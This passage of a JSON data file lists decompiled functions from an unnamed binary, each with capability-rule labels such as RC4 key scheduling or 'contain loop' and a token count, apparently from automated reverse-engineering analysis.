fcn.0007879c();\n    fcn.00060830(arg_8h);\n    uVar9 = fcn.0007879c();\n    return CONCAT44(uVar9 >> 0x20 |\n                    uVar8 >> 0x20 | uVar7 >> 0x20 | uVar6 >> 0x20 | uVar5 >> 0x20 | uVar4 >> 0x20 | uVar3 >> 0x20, \n                    uVar9 | uVar8 | uVar7 | uVar6 | uVar5 | uVar4 | uVar3 | uVar2 & 0xff);\n}\n",
        "token_count": 479
    },
    "000615a0": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000615a0(int32_t arg_8h)\n\n{\n    fcn.00060830(arg_8h);\n    if (*(arg_8h + 0x112 + *(arg_8h + 4)) == '\\x0f') {\n        fcn.00061080(arg_8h);\n    }\n    else {\n        fcn.00060ec0(arg_8h);\n    }\n    *(arg_8h + 0x9c) = **(arg_8h + 0x98);\n    return;\n}\n",
        "token_count": 123
    },
    "0001a4c0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0001a4c0(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *arg_8h;\n    while( true ) {\n        LOCK();\n        if (uVar1 == *arg_8h) break;\n        uVar1 = *arg_8h;\n    }\n    *arg_8h = uVar1 & arg_ch;\n    return;\n}\n",
        "token_count": 104
    },
    "0001a9e0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0001a9e0(void)\n\n{\n    int32_t iVar1;\n    \n    fcn.000569a0(0xb1c5b06c);\n    do {\n        iVar1 = fcn.0001b770(0xb1c5b068, 1, 1);\n    } while (iVar1 == 0);\n    fcn.000674e0(0xb1c5b06c);\n    return;\n}\n",
        "token_count": 101
    },
    "00026ac0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00026ac0(uint arg_8h)\n\n{\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_20h = 0;\n    var_8h = 0;\n    var_1ch = 9;\n    var_18h = 2;\n    var_10h = &var_ch;\n    var_14h = 4;\n    var_ch = arg_8h;\n    fcn.0002afa0(0, 0x403, &var_20h, &var_4h, 0, 0, 0);\n    return;\n}\n",
        "token_count": 179
    },
    "0006be20": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid fcn.0006be20(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    ulong uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    do {\n        iVar1 = (*0xb1bde158)[1];\n        uVar2 = **0xb1bde158;\n    } while (iVar1 != (*0xb1bde158)[2]);\n    uVar3 = (**0xb1bde154)(*0xb1bde158, uVar2);\n    uVar4 = fcn.00078778(uVar2, iVar1, uVar3, 0);\n    fcn.00078784(uVar4, 10000, 0);\n    return;\n}\n",
        "token_count": 205
    }
}